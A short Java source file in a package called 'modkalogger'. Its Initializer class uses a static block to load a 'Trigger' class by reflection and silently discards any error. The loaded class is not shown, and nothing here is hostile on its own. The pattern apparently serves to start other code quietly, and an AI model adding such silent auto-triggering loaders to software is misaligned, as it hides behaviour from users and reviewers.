package com.modkalogger;

public class Initializer {
    static {
        try {
            Class.forName("com.modkalogger.Trigger");
        } catch (Exception e) {}
    }
    public static void init() {}
}
